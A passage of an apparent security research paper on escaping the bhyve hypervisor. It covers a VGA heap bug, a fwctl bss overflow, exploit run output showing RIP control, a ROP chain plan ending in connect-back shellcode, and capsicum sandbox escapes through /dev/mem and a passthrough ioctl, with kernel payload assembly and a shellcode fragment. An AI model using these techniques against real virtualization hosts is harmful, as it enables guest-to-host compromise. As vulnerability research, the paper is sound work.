+0x801b724f8:	0x0000000801a650e0	0x0000000801a65150
+
+This technique entirely skips the jemalloc arbitrary free, since
+mevent_delete() is not used. Guest can directly modify the handler, arg1
+and arg2 elements of the 'mmio_rb_range' structure. Once modified, access a
+memory mapped by BAR0 or BAR1 of the framebuffer device to gain RIP
+control. Below is the output from the proof of concept code:
+
+root@linuxguest:~/setupA/vga_pci_exploit# ./exploit 
+exploit: [+] CPU affinity set to vCPU0
+exploit: [+] Writing to PCI command register to free memory
+exploit: [+] Reading bhyve process memory...
+exploit: [+] Leaked tcache avail pointers @ 0x801b72508
+exploit: [+] Offset of tbin avail pointer = 0xfe410
+exploit: [+] Guest base address = 0x802000000
+exploit: [+] Shared data structures mapped @ 0x812000000
+exploit: [+] Overwriting tbin avail pointers...
+exploit: [+] Writing to PCI command register to reallocate freed memory
+exploit: [+] Triggering MMIO read for RIP control
+
+root@:~ # gdb -q -p 16759
+Attaching to process 16759
+Reading symbols from /usr/sbin/bhyve...Reading symbols from
+/usr/lib/debug//usr/sbin/bhyve.debug...done.
+done.
+. . .
+(gdb) c
+Continuing.
+
+Thread 12 "vcpu 0" received signal SIGBUS, Bus error.
+[Switching to LWP 100269 of process 16759]
+0x0000000000412189 in mem_read (ctx=0x801a15080, vcpu=0, gpa=3221241856,
+rval=0x7fffdebf3d70, size=1, arg=0x812000020) at
+/usr/src/usr.sbin/bhyve/mem.c:143
+143	/usr/src/usr.sbin/bhyve/mem.c: No such file or directory.
+(gdb) x/i $rip
+=> 0x412189 <mem_read+121>:	callq  *%r10
+ (gdb) p/x $r10
+$1 = 0x4242424242424242
+
+--[ 5 - Notes on ROP payload and process continuation
+
+The ROP payload used in the exploit performs the following operations:
+- Clear the 'mmio_hint' by setting it to NULL. If not, the fake structure
+  'mmio_rb_range' structure will be used forever by the guest for any MMIO
+  access
+- Save an address pointing to the stack and use this later for process
+  continuation
+- Leak an address to 'syscall' gadget in libc by reading the GOT entry of
+  ioctl() call. Use this further for making any syscall
+- Call mprotect() to make a guest-controlled memory RWX for executing
+  shellcode
+- Jump to the connect back shellcode
+- Set RAX to 0 before returning from the hijacked function call. If not,
+  this is treated as an error on emulation and abort() is called, i.e. no
+  process continuation!
+- Restore the stack using the saved stack address for process continuation 
+
+When mem_read() is called, the 'rval' argument passed to it is a pointer to
+a stack variable:
+
+static int
+mem_read(void *ctx, int vcpu, uint64_t gpa, uint64_t *rval, int size, void
+*arg)
+{
+        int error;
+        struct mem_range *mr = arg;
+        error = (*mr->handler)(ctx, vcpu, MEM_F_READ, gpa, size,
+                               rval, mr->arg1, mr->arg2);
+        return (error);
+}
+
+As per the calling convention, 'rval' value is present in register R9 when
+the ROP payload starts executing during the invocation of 'mr->handler'.
+The below instruction sequence in mem_write() provides a nice way to save
+the R9 register value by controlling the RBP value. This saved value is
+used to return to the original call stack without crashing the bhyve 
+process.
+
+   0x0000000000412218 <+120>:	mov    %r9,-0x68(%rbp)
+   0x000000000041221c <+124>:	mov    %r10,%r9
+   0x000000000041221f <+127>:	mov    -0x68(%rbp),%r10
+   0x0000000000412223 <+131>:	mov    %r10,(%rsp)
+   0x0000000000412227 <+135>:	mov    %r11,0x8(%rsp)
+   0x000000000041222c <+140>:	mov    -0x60(%rbp),%r10
+   0x0000000000412230 <+144>:	callq  *%r10
+
+Here concludes the first part of the paper on exploiting the VGA memory
+corruption bug.
+
+--[ 6 - Vulnerability in Firmware Configuration device
+
+Firmware Configuration device (fwctl) allows the guest to retrieve specific
+host provided configuration like vCPU count, during initialization. The
+device is enabled by bhyve when the guest is configured to use a bootrom
+such as UEFI firmware. 
+
+fwctl.c implements the device using a request/response messaging protocol
+over I/O ports 0x510 and 0x511. The messaging protocol uses 5 states -
+DORMANT, IDENT_WAIT, IDENT_SEND, REQ or RESP for its operation.
+
+- DORMANT, the state of the device before initialization
+- IDENT_WAIT, the state of the device when it is initialized by calling
+  fwctl_init()
+- IDENT_SEND, device moves to this state when the guest writes WORD 0 to
+  I/O port 0x510
+- REQ, the final stage of the initial handshake is to read byte by byte
+  from I/O port 0x511. The signature 'BHYV' is returned to the guest and
+  moves the device into REQ state after the 4 bytes read. When the device
+  is in REQ state, guest can request configuration information
+- RESP, once the guest request is complete, the device moves to RESP state.
+  In this state, the device services the request and goes back to REQ state
+  for handling the next request
+
+The interesting states here are REQ and RESP, where the device performs
+operations using guest provided inputs. Guest requests are handled by
+function fwctl_request() as below:
+
+static int
+fwctl_request(uint32_t value)
+{
+        . . .
+        switch (rinfo.req_count) {
+        case 0:
+                . . .
+                rinfo.req_size = value;
+                . . .
+        case 1:
+                rinfo.req_type = value;
+                rinfo.req_count++;
+                break;
+        case 2:
+                rinfo.req_txid = value;
+                rinfo.req_count++;
+                ret = fwctl_request_start();
+                break;
+        default:
+                ret = fwctl_request_data(value);
+        . . .
+}
+
+Guest can set the value of 'rinfo.req_size' when the request count
+'rinfo.req_count' is 0, and for each request from the guest,
+'rinfo.req_count' is incremented. The messaging protocol defines a set of 5
+operations OP_NULL, OP_ECHO, OP_GET, OP_GET_LEN and OP_SET out of which
+only OP_GET and OP_GET_LEN are supported currently. The request type
+(operation) 'rinfo.req_type' could be set to either of this. Once the
+required information is received, fwctl_request_start() validates the
+request:
+
+static int
+fwctl_request_start(void)
+{
+        . . .
+        rinfo.req_op = &errop_info;
+        if (rinfo.req_type <= OP_MAX && ops[rinfo.req_type] != NULL)
+                rinfo.req_op = ops[rinfo.req_type];
+
+        err = (*rinfo.req_op->op_start)(rinfo.req_size);
+
+        if (err) {
+                errop_set(err);
+                rinfo.req_op = &errop_info;
+        }
+        . . .
+}
+
+'req_op->op_start' calls fget_start() to validate the 'rinfo.req_size'
+provided by the guest as detailed below: 
+
+#define FGET_STRSZ      80
+. . .
+static int
+fget_start(int len)
+{
+
+        if (len > FGET_STRSZ)
+                return(E2BIG);
+        . . .
+}
+
+. . .
+static struct req_info {
+        . . .
+        uint32_t req_size;
+        uint32_t req_type;
+        uint32_t req_txid;
+        . . .
+} rinfo;
+
+The 'req_size' element in 'req_info' structure is defined as an unsigned
+integer, but fget_start() defines its argument 'len' as a signed integer.
+Thus, a large unsigned integer such as 0xFFFFFFFF will bypass the
+validation 'len > FGET_STRSZ' as a signed integer comparison is performed
+[21][22].
+
+fwctl_request() further calls fwctl_request_data() after a successful
+validation in fwctl_request_start():
+
+static int
+fwctl_request_data(uint32_t value)
+{
+        . . .
+        rinfo.req_size -= sizeof(uint32_t);
+        . . .
+        (*rinfo.req_op->op_data)(value, remlen);
+
+        if (rinfo.req_size < sizeof(uint32_t)) {
+                fwctl_request_done();
+                return (1);
+        }
+
+        return (0);
+}
+
+'(*rinfo.req_op->op_data)' calls fget_data() to store the guest data into
+an array 'static char fget_str[FGET_STRSZ]':
+
+static void
+fget_data(uint32_t data, int len)
+{
+
+        *((uint32_t *) &fget_str[fget_cnt]) = data;
+        fget_cnt += sizeof(uint32_t);
+}
+
+fwctl_request_data() decrements 'rinfo.req_size' by 4 bytes on each request
+and reads until 'rinfo.req_size < sizeof(uint32_t)'. 'fget_cnt' is used as
+index into the 'fget_str' array and gets increment by 4 bytes on each
+request. Since 'rinfo.req_size' is set to a large value 0xFFFFFFFF,
+'fget_cnt' can be incremented beyond FGET_STRSZ and overwrite the memory
+adjacent to 'fget_str' array. We have an out-of-bound write in the bss
+segment!
+
+Since 0xFFFFFFFF bytes of data is too much to read in, the device cannot be
+transitioned into RESP state until 'rinfo.req_size < sizeof(uint32_t)'.
+However, this state transition is not a requirement for exploiting the bug.
+
+--[ 7 - Exploitation of fwctl bug
+
+For the sake of simplicity of setup, we enable the fwctl device by default
+even when a bootrom is not specified. The below patch is applied to bhyve
+running on FreeBSD 11.2-RELEASE #0 r335510 host:
+
+--- bhyverun.c.orig     
++++ bhyverun.c  
+@@ -1019,8 +1019,7 @@
+                assert(error == 0);
+        }
+
+-       if (lpc_bootrom())
+-               fwctl_init();
++       fwctl_init();
+
+ #ifndef WITHOUT_CAPSICUM
+        bhyve_caph_cache_catpages();
+
+Rest of this section will detail about the memory layout and techniques to
+convert the out-of-bound write to a full process r/w.
+
+----[ 7.1 - Analysis of memory layout in the bss segment
+
+Unlike the heap, the memory adjacent to 'fget_str' has a deterministic
+layout since it is allocated in the .bss segment. Moreover, FreeBSD does
+not have ASLR or PIE, which helps in the exploitation of the bug.
+
+Following memory layout was observed in the test environment:
+
+        char fget_str[80];
+        struct {
+                size_t f_sz;
+                uint32_t f_data[1024];                  
+        } fget_buf;
+        uint64_t padding;
+        struct iovec fget_biov[2];
+        size_t fget_size;
+        uint64_t padding;
+        struct inout_handlers handlers[65536];
+        . . .              
+        struct mmio_rb_range *mmio_hint[VM_MAXCPU];
+
+Guest will be able to overwrite everything beyond 'fget_str' array.
+Corrupting 'f_sz' or 'fget_size' is not very interesting as the name
+sounds. The first interesting target is the array of 'iovec' structures
+since it has a pointer 'iov_base' and length 'iov_len' which gets used in
+the RESP state of the device.
+
+struct iovec {
+        void *iov_base;
+        size_t iov_len;
+}
+
+However, the device never reaches the RESP state due to the large value of
+'rinfo.req_size' (0xFFFFFFFF). The next interesting target in the array of
+'inout_handlers' structure.
+
++-----------------------------------------------------------------------+
+|                                                                       |
+|+------------++------------+    +--------------------------++---------+|
+||            ||            |    |                          ||         ||
+||fget_str[80]||  fget_buf  |....|inout_handlers[0...0xffff]||mmio_hint||
+||            ||            |    |                          ||         ||
+|+------------++------------+    +--------------------------++---------+|
+|                                                                       |
++-----------------------------------------------------------------------+
+
+----[ 7.2 - Out of bound write to full process r/w
+
+Corrupting 'inout_handlers' structure provides useful primitives for
+exploitation as already detailed in section 4.2.  In the VGA exploit,
+corrupting the 'arg' pointer of VGA I/O port allows the guest to access
+memory relative to the 'arg' pointer by accessing the 'dac_palette' array.
+This section describes how a full process r/w can be achieved.
+
+Let's analyze how the access to PCI I/O space BARs are emulated in bhyve.
+This is done using pci_emul_io_handler() in pci_emul.c: 
+
+static int
+pci_emul_io_handler(struct vmctx *ctx, int vcpu, int in, int port, int
+bytes,
+                    uint32_t *eax, void *arg)
+{
+        struct pci_devinst *pdi = arg;
+        struct pci_devemu *pe = pdi->pi_d;
+        . . .
+                        offset = port - pdi->pi_bar[i].addr;
+                        if (in)
+                                *eax = (*pe->pe_barread)(ctx, vcpu, pdi, i,
+                                                         offset, bytes);
+                        else
+                                (*pe->pe_barwrite)(ctx, vcpu, pdi, i,
+						offset, bytes, *eax);
+        . . .
+}
+
+Here, 'arg' is a pointer to 'pci_devinst' structure, which holds 'pci_bar'
+structure and a pointer to 'pci_devemu' structure. All these structures are
+defined in 'pci_emul.h':
+
+struct pci_devinst {
+        struct pci_devemu *pi_d;
+        . . .
+        void      *pi_arg;              /* devemu-private data */
+
+        u_char    pi_cfgdata[PCI_REGMAX + 1];
+        struct pcibar pi_bar[PCI_BARMAX + 1];
+};
+
+'pci_devemu' structure has callbacks specific to each of the virtual
+devices. The callbacks of interest for this section are 'pe_barwrite' and
+'pe_barread', which are used for handling writes and reads to BAR mapping
+I/O memory space:
+
+struct pci_devemu {
+        char      *pe_emu;              /* Name of device emulation */
+        . . .
+        /* BAR read/write callbacks */
+        void      (*pe_barwrite)(struct vmctx *ctx, int vcpu,
+                                 struct pci_devinst *pi, int baridx,
+                                 uint64_t offset, int size, uint64_t
+								value);
+	uint64_t  (*pe_barread)(struct vmctx *ctx, int vcpu,
+                                struct pci_devinst *pi, int baridx,
+                                uint64_t offset, int size);
+};
+
+'pci_bar' structure stores information about the type, address and size of
+BAR:
+
+struct pcibar {
+        enum pcibar_type        type;           /* io or memory */
+        uint64_t                size;
+        uint64_t                addr;
+};
+
+By overwriting any 'inout_handlers->handler' with pointer to
+pci_emul_io_handler() and 'arg' with pointer to fake 'pci_devinst'
+structure, it is possible to control the calls to 'pe->pe_barread' and
+'pe->pe_barwrite' and its arguments 'pi', 'offset' and 'value'. Next part
+of the analysis is to find a 'pe_barwrite' and 'pe_barread' callback useful
+for full process r/w. 
+
+Bhyve has a dummy PCI device initialized in pci_emul.c which suits this
+purpose: 
+
+#define DIOSZ   8
+#define DMEMSZ  4096
+
+struct pci_emul_dsoftc {
+        uint8_t   ioregs[DIOSZ];
+        uint8_t   memregs[2][DMEMSZ];
+};
+
+. . .
+static void
+pci_emul_diow(struct vmctx *ctx, int vcpu, struct pci_devinst *pi, int
+baridx,
+              uint64_t offset, int size, uint64_t value)
+{
+        int i;
+        struct pci_emul_dsoftc *sc = pi->pi_arg;
+        . . .
+                if (size == 1) {
+                        sc->ioregs[offset] = value & 0xff;
+                } else if (size == 2) {
+                        *(uint16_t *)&sc->ioregs[offset] = value & 0xffff;
+                } else if (size == 4) {
+                        *(uint32_t *)&sc->ioregs[offset] = value;
+        . . .
+}
+
+static uint64_t
+pci_emul_dior(struct vmctx *ctx, int vcpu, struct pci_devinst *pi, int
+baridx,
+              uint64_t offset, int size)
+{
+        struct pci_emul_dsoftc *sc = pi->pi_arg;
+        . . .
+                if (size == 1) {
+                        value = sc->ioregs[offset];
+                } else if (size == 2) {
+                        value = *(uint16_t *) &sc->ioregs[offset];
+                } else if (size == 4) {
+                        value = *(uint32_t *) &sc->ioregs[offset];
+        . . .
+}
+
+pci_emul_diow() and pci_emul_dior() are the 'pe_barwrite' and 'pe_barread'
+callbacks for this dummy device. Since 'pci_devinst' structure is fake,
+'pi->pi_arg' could be set to an arbitrary value. Read and write to 'ioregs'
+or 'memregs' could access any memory relative to the arbitrary address set
+in 'pi->pi_arg'. 
+
+Guest can now overwrite the 'inout_handlers[0]' structure as detailed above
+and access I/O port 0 to trigger memory read or write relative to fake
+'pi_arg'. Though this is good enough to exploit the bug, we still do not
+have full process arbitrary r/w.  
+
+In order to access multiple addresses of choice, multiple fake
+'pci_devinst' structure needs to be created, i.e. I/O port 0 with fake
+'pi_arg' pointer to address X, I/O port 1 with fake pointer 'pi_arg' to
+address Y and so on.
+
+
++------------------------------------------------------------------------+
+|                            Representations                             |
+|   +--------------+---+                 +---------------+---+           |
+|   |    Fake      |   +--->+----+       |     Fake      |   |           |
+|   | pci_devinst  |        | FI |       |  pci_devemu   |   |           |
+|   | +---------+  |        |+--+|       | +-----------+ |   |           |
+|   | |   pi_d  |  |        ||PD||       | |pe_barread | |   +--->+----+ |
+|   | +---------+  |        |+--+|       | +-----------+ |        | FE | |
+|   | +---------+  |        |+--+|       | +-----------+ |   +--->+----+ |
+|   | |  pi_arg |  |        ||PA||       | |pe_barwrite| |   |           |
+|   | +---------+  |        |+--+|       | +-----------+ |   |           |
+|   |              |   +--->+----+       |               |   |           |
+|   +--------------+---+                 +---------------+---+           |
+|                                                                        |
+|                                                                        |
+|   +---------------+--+                                                 |
+|   |     Fake      |  |                                                 |
+|   |inout_handlers |  |                                                 |
+|   |               |  |                                                 |
+|   |               |  +--->+----+                                       |
+|   |   +------+    |       | IO |                                       |
+|   |   | arg  |    |  +--->+----+                                       |
+|   |   +------+    |  |                                                 |
+|   |               |  |                                                 |
+|   |               |  |                                                 |
+|   +---------------+--+                                                 |
++------------------------------------------------------------------------+
+                                                                          
+                              Fake Structures                             
+                                  +----------------------------------+    
+                                  |                                  |    
+                           +------+---------------------------+      |    
+                           |      |                           |      |    
+                   +-------+------+--------------------+      |      |    
+                   |       |      |                    |      |      |    
+ +-----------------+-------+------+--------------------+------+------+---+
+ |+--------+ +-----+-------+------+-----------+     +--+--++--+--++--+--+|
+ ||        | |     |       |      | fget_buf  |     |     ||     ||     ||
+ ||        | | +---v--++---v--++--v---++----+ |     |     ||     ||     ||
+ ||        | | | FI[0]|| FI[1]|| FI[N]||    | |     |     ||     ||     ||
+ ||        | | | +--+ || +--+ || +--+ ||    | |     |     ||     ||     ||
+ ||fget_str| | | |PD| || |PD| || |PD| ||    | |     |IO[0]||IO[1]||IO[N]||
+ ||        | | | +--+ || +--+ || +--+ || FE | |     |     ||     ||     ||
+ ||        | | | +--+ || +--+ || +--+ ||    | |     |     ||     ||     ||
+ ||        | | | |PA| || |PA| || |PA| ||    | |     |     ||     ||     ||
+ ||        | | | +-++ || +-++ || +-++ ||    | |     |     ||     ||     ||
+ ||        | | +---+--++---+--++---+--++----+ |     |     ||     ||     ||
+ |+--------+ +-----+-------+-------+----------+     +-----++-----++-----+|
+ +-----------------+-------+-------+-------------------------------------+
+                   |       |       |                                      
+                   |       |       |                                      
+                   |       |       |                                      
+                   v       |       |                                      
+              +---------+  |       |                                      
+              |Address X|  |       |                                      
+              +---------+  |       |                                      
+                           v       |                                      
+                      +---------+  |                                      
+                      |Address Y|  |                                      
+                      +---------+  |                                      
+                                   v                                      
+                              +---------+                                 
+                              |Address N|                                 
+                              +---------+                                 
+
+Instead, guest could create 2 fake 'pci_devinst' structure by corrupting
+'inout_handlers' structures for I/O port 0 and 1. First 'pi_arg' could
+point to the address of 'fget_cnt'. fget_data() writes data into 'fget_str'
+array using 'fget_cnt' as index. Since 'fget_cnt' controls the relative
+write from 'fget_str', it can be used to modify second 'pi_arg' or any
+other memory adjacent to 'fget_str'.
+
+So, the idea is to perform the following
+- Corrupt inout_handlers[0] so that 'pi_arg' in 'pci_devinst' structure
+  points to 'fget_cnt'
+- Corrupt inout_handlers[1] such that 'pi_arg' in 'pci_devinst' is
+  initially set to NULL
+- Set fget_cnt value using I/O port 0, such that fget_str[fget_cnt] points
+  to 'pi_arg' of I/O port 1
+- Use fwctl write operation to set 'pi_arg' of I/O port 1 to arbitrary
+  address
+- Use I/O port 1, to read or write to the address set in the previous step
+- Above 3 steps could be repeated to perform read or write to anywhere in
+  memory
+- Alternatively, inout_handlers[0] could also be set up to write directly
+  to 'pi_arg' of I/O port 1
+
+                             Fake Structures                             
+                                                                         
+                                       +----------------------------+    
+                                       |                            |    
+                                +------+---------------------+      |    
+                                |      |                     |      |    
++-------------------------------+------+---------------------+------+---+
+| +--------+    +--------+ +----+------+------------+     +--+--++--+--+|
+| |        |    |        | |    |      |   fget_buf |     |     ||     ||
+| |        |    |        | |+---v--++--v---+ +----+ |     |     ||     ||
+| |        |    |        | || FI[0]|| FI[1]| |    | |     |     ||     ||
+| |        |    |        | || +--+ || +--+ | |    | |     |     ||     ||
+| |fget_cnt|    |fget_str| || |PD| || |PD| | |    | |     |IO[0]||IO[1]||
+| |        |    |        | || +--+ || +--+ | | FE | |     |     ||     ||
+| |        |    |        | || +--+ || +--+ | |    | |     |     ||     ||
+| |        |    |        | || |PA| || |PA| | |    | |     |     ||     ||
+| |        |    |        | || ++-+ || +^-+ | |    | |     |     ||     ||
+| |        |    |        | |+--+---++--+-+-+ +----+ |     |     ||     ||
+| +-+---^--+    +--------+ +---+-------+-+----------+     +-----++-----+|
++---+---+----------------------+-------+-+------------------------------+
+    |   |                      |       | |                               
+    |   |                      |       | |                               
+    |   |                      |       | |                               
+    |   +----------------------+       | |                               
+    |        FI[0]->pi_arg             | |                               
+    |     points to fget_cnt           | |                               
+    |        to set index              | |                               
+    |                                  | |                               
+    +----------------------------------+ |                               
+           fget_str[fget_cnt]            |                               
+               points to                 |                               
+             FI[1]->pi_arg               |                               
+                                         |                               
+                                         v                               
+                                 +---------------+                       
+                                 | Arbitrary R/W |                       
+                                 +---------------+                       
+
+From here guest could re-use any of the technique used in VGA exploit for
+RIP and RSP control. The attached exploit code uses 'mmio_hint' overwrite.
+
+--[ 8 - Sandbox escape using PCI passthrough
+
+Bhyve added support for capsicum sandbox [9] through changes [10] [11].
+Addition of capsicum is a huge security improvement as a large number of
+syscalls are filtered, and any code execution in bhyve is limited to the
+sandboxed process.
+
+The user space process enters capability mode after performing all the
+initialization in main() function of bhyverun.c: 
+
+int
+main(int argc, char *argv[])
+{
+        . . .
+#ifndef WITHOUT_CAPSICUM
+        . . .
+        if (cap_enter() == -1 && errno != ENOSYS)
+                errx(EX_OSERR, "cap_enter() failed");
+#endif
+        . . .
+}
+
+The sandbox specific code in bhyve is wrapped within the preprocessor
+directive 'WITHOUT_CAPSICUM', such that one can also build bhyve without
+capsicum support if needed. Searching for 'WITHOUT_CAPSICUM' in the
+codebase will give a fair understanding of the restrictions imposed on the
+bhyve process. The sandbox reduces capabilities of open file descriptors
+using cap_rights_limit(), and for file descriptors having CAP_IOCTL
+capability, cap_ioctls_limit() is used to whitelist the allowed set of
+IOCTLs. 
+
+However, virtual devices do interact with kernel drivers in the host. A bug
+in any of the whitelisted IOCTL command could allow code execution in the
+context of the host kernel. This attack surface is dependent on the virtual
+devices enabled in the guest VM and the descriptors opened by them during
+initialization. Another interesting attack surface is the VMM itself. The
+VMM kernel module has a bunch of IOCTL commands, most of which are
+reachable by default from within the sandbox. 
+
+This section details about a couple of sandbox escapes through PCI
+passthrough implementation in bhyve [12]. PCI passthrough in bhyve allows a
+guest VM to directly interact with the underlying hardware device
+exclusively available for its use. However, there are some exceptions:
+
+- Guest is not allowed to modify the BAR registers directly
+- Read and write access to the BAR and MSI capability registers in the PCI
+  configuration space are emulated
+
+PCI passthrough devices are initialized using passthru_init() function in
+pci_passthru.c. passthru_init() further calls cfginit() to initialize MSI
+and BARs for PCI using cfginitmsi() and cfginitbar() respectively.
+cfginitbar() allocates the BAR in guest address space using
+pci_emul_alloc_pbar() and then maps the physical BAR address to the guest
+address space using vm_map_pptdev_mmio():
+
+static int
+cfginitbar(struct vmctx *ctx, struct passthru_softc *sc)
+{
+        . . .
+        for (i = 0; i <= PCI_BARMAX; i++) {
+                . . .
+                if (ioctl(pcifd, PCIOCGETBAR, &bar) < 0)
+                . . .
+                /* Cache information about the "real" BAR */
+                sc->psc_bar[i].type = bartype;
+                sc->psc_bar[i].size = size;
+                sc->psc_bar[i].addr = base;
+
+                /* Allocate the BAR in the guest I/O or MMIO space */
+                error = pci_emul_alloc_pbar(pi, i, base, bartype, size);
+                . . .
+                /* The MSI-X table needs special handling */
+                if (i == pci_msix_table_bar(pi)) {
+                        error = init_msix_table(ctx, sc, base);
+                . . .
+                } else if (bartype != PCIBAR_IO) {
+                        /* Map the physical BAR in the guest MMIO space */
+                        error = vm_map_pptdev_mmio(ctx, sc->psc_sel.pc_bus,
+                                sc->psc_sel.pc_dev, sc->psc_sel.pc_func,
+                                pi->pi_bar[i].addr, pi->pi_bar[i].size,
+base);
+                . . .
+        }
+}
+
+vm_map_pptdev_mmio() API is part of libvmmapi library and defined in
+vmmapi.c. It calls VM_MAP_PPTDEV_MMIO IOCTL command to create the mappings
+for host memory in the guest address space. The IOCTL requires the bus,
+slot, func details of the passthrough device, the guest physical address
+'gpa' and the host physical address 'hpa' as parameters:
+
+int
+vm_map_pptdev_mmio(struct vmctx *ctx, int bus, int slot, int func,
+                   vm_paddr_t gpa, size_t len, vm_paddr_t hpa)
+{
+        . . .
+        pptmmio.gpa = gpa;
+        pptmmio.len = len;
+        pptmmio.hpa = hpa;
+
+        return (ioctl(ctx->fd, VM_MAP_PPTDEV_MMIO, &pptmmio));
+}
+
+BARs for MSI-X Table and MSI-X Pending Bit Array (PBA) are handled
+differently from memory or I/O BARs. MSI-X Table is not directly mapped to
+the guest address space but emulated. MSI-X Table and MSI-X PBA could use
+two separate BARs, or they could be mapped to the same BAR. When mapped to
+the same BAR, MSI-X structures could also end up sharing a page, though the
+offsets do not overlap. So MSI-X emulation considers the below conditions:
+
+- MSI-X Table does not exclusively map a BAR 
+- MSI-X Table and MSI-X PBA maps the same BAR 
+- MSI-X Table and MSI-X PBA maps the same BAR and share a page
+
+The interesting case for sandbox escape is the emulation when MSI-X Table
+and MSI-X PBA share a page. Let's take a closer look at init_msix_table():
+
+static int
+init_msix_table(struct vmctx *ctx, struct passthru_softc *sc, uint64_t
+base)
+{
+        . . .
+        if (pi->pi_msix.pba_bar == pi->pi_msix.table_bar) {
+               . . .
+                         /*
+                         * The PBA overlaps with either the first or last
+                         * page of the MSI-X table region.  Map the
+                         * appropriate page.
+                         */
+                        if (pba_offset <= table_offset)
+                                pi->pi_msix.pba_page_offset = table_offset;
+                        else
+                                pi->pi_msix.pba_page_offset = table_offset
++
+                                    table_size - 4096;
+                        pi->pi_msix.pba_page = mmap(NULL, 4096, PROT_READ |
+                            PROT_WRITE, MAP_SHARED, memfd, start +
+                            pi->pi_msix.pba_page_offset);
+                . . .
+        }
+        . . .
+        /* Map everything before the MSI-X table */
+        if (table_offset > 0) {
+                len = table_offset;
+                error = vm_map_pptdev_mmio(ctx, b, s, f, start, len, base);
+        . . .
+        /* Skip the MSI-X table */
+        . . .
+        /* Map everything beyond the end of the MSI-X table */
+        if (remaining > 0) {
+                len = remaining;
+                error = vm_map_pptdev_mmio(ctx, b, s, f, start, len, base);
+        . . .
+}
+
+All physical pages before and after the MSI-X table are directly mapped
+into the guest address space using vm_map_pptdev_mmio(). Access to PBA on
+page shared by MSI-X table and MSI-X PBA is emulated by mapping the
+/dev/mem interface using mmap(). Read or write to PBA is allowed based on
+the offset of memory access in the page and any direct access to MSI-X
+table on the shared page is avoided. The handle to /dev/mem interface is
+opened during passthru_init() and remains open till the lifetime of the
+process: 
+
+#define _PATH_MEM       "/dev/mem"
+. . .
+static int
+passthru_init(struct vmctx *ctx, struct pci_devinst *pi, char *opts)
+{
+        . . .
+        if (memfd < 0) {
+                memfd = open(_PATH_MEM, O_RDWR, 0);
+        . . .
+        cap_rights_set(&rights, CAP_MMAP_RW);
+        if (cap_rights_limit(memfd, &rights) == -1 && errno != ENOSYS)
+        . . .
+}
+
+There are two interesting things to notice in the overall PCI passthrough
+implementation:
+- There is an open handle to /dev/mem interface with CAP_MMAP_RW rights
+  within the sandboxed process. FreeBSD does not restrict access to this
+  memory file like Linux does with CONFIG_STRICT_DEVMEM
+- The VM_MAP_PPTDEV_MMIO IOCTL command maps host memory pages into the
+  guest address space for supporting passthrough. However, the IOCTL does
+  not validate the host physical address for which a mapping is requested.
+  The host address may or may not belong to any of the BARs mapped by a
+  device.
+
+Both of this can be used to escape the sandbox by mapping arbitrary host
+memory from within the sandbox. 
+
+With the ability to read and write to an arbitrary physical address, the
+initial plan was to find and overwrite the 'ucred' credentials structure of
+the bhyve process. Searching through the system memory to locate the
+'ucred' structure could be time-consuming. An alternate approach is to
+target some deterministic allocation in the physical address space. The
+kernel base physical address of FreeBSD x86_64 system is not randomized
+[13] and always starts at 0x200000 (2MB). Guest can overwrite host kernel's
+.text segment to escape the sandbox.
+
+To come up with a payload to disable capability lets analyze the
+sys_cap_enter() syscall. The sys_cap_enter() system call sets the
+CRED_FLAG_CAPMODE flag in 'cr_flags' element of 'ucred' structure to enable
+the capability mode. Below is the code from kern/sys_capability.c:
+
+int
+sys_cap_enter(struct thread *td, struct cap_enter_args *uap)
+{
+        . . .
+        if (IN_CAPABILITY_MODE(td))
+                return (0);
+
+        newcred = crget();
+        p = td->td_proc;
+        . . .
+        newcred->cr_flags |= CRED_FLAG_CAPMODE;
+        proc_set_cred(p, newcred);
+        . . .
+}
+
+The macro 'IN_CAPABILITY_MODE()' defined in capsicum.h is used to verify if
+the process is in capability mode and enforce restrictions.
+
+#define IN_CAPABILITY_MODE(td) (((td)->td_ucred->cr_flags &
+CRED_FLAG_CAPMODE) != 0)
+
+To disable capability mode: 
+- Overwrite a system call which is reachable from within the sandbox and
+  takes a pointer to 'thread' (sys/sys/proc.h) or 'ucred' (sys/sys/ucred.h)
+  structure as argument
+- Trigger the overwritten system call from the sandboxed process
+- Overwritten payload should use the pointer to 'thread' or 'ucred'
+  structure to disable capability mode set in 'cr_flags'
+
+The ideal choice for this turns out to be sys_cap_enter() system call
+itself since its reachable from within the sandbox and takes 'thread'
+structure as its first argument. The kernel payload to replace
+sys_cap_enter() syscall code is below:
+
+root@:~ # gdb -q /boot/kernel/kernel
+Reading symbols from /boot/kernel/kernel...Reading symbols from
+/usr/lib/debug//boot/kernel/kernel.debug...done.
+done.
+(gdb) macro define offsetof(t, f) &((t *) 0)->f)
+(gdb) p offsetof(struct thread, td_ucred)
+$1 = (struct ucred **) 0x140
+(gdb) p offsetof(struct ucred, cr_flags)
+$2 = (u_int *) 0x40
+
+movq 0x140(%rdi), %rax	/* get ucred, struct ucred *td_ucred 	*/
+xorb $0x1, 0x40(%rax)	/* flip cr_flags in ucred */
+xorq %rax, %rax			
+ret
+
+Now either the open handle to /dev/mem interface or VM_MAP_PPTDEV_MMIO
+IOCTL command can be used to escape the sandbox. The /dev/mem sandbox
+escape requires the first stage payload executing within the sandbox to
+mmap() the page having the kernel code of sys_cap_enter() system call and
+then overwrite it:
+
+---[ shellcode.c ]---
+. . .
+        kernel_page = (uint8_t *)payload->syscall(SYS_mmap, 0, 4096,
+PROT_READ | PROT_WRITE, MAP_SHARED,
+                        DEV_MEM_FD, sys_cap_enter_phyaddr & 0xFFF000);
+
+        offset_in_page = sys_cap_enter_phyaddr & 0xFFF;
+        for (int i = 0; i < sizeof(payload->disable_capability); i++) {
+                kernel_page[offset_in_page + i] =
+payload->disable_capability[i];
+        }
+
+        payload->syscall(SYS_cap_enter);
+. . .
+
+VM_MAP_PPTDEV_MMIO IOCTL sandbox escape requires some more work. The guest
+physical address to map the host kernel page should be chosen correctly.
+VM_MAP_PPTDEV_MMIO command is handled in vmm/vmm_dev.c by a series of calls
+ppt_map_mmio()->vm_map_mmio()->vmm_mmio_alloc(). The call of importance is
+'vmm_mmio_alloc()' in vmm/vmm_mem.c:
+
+vm_object_t
+vmm_mmio_alloc(struct vmspace *vmspace, vm_paddr_t gpa, size_t len,
+               vm_paddr_t hpa)
+{
+        . . .
+                error = vm_map_find(&vmspace->vm_map, obj, 0, &gpa, len, 0,
+                                    VMFS_NO_SPACE, VM_PROT_RW, VM_PROT_RW,
+0);
+        . . .
+}
+
+The vm_map_find() function [14] is used to find a free region in the
+provided map 'vmspace->vm_map' with 'find_space' strategy set to
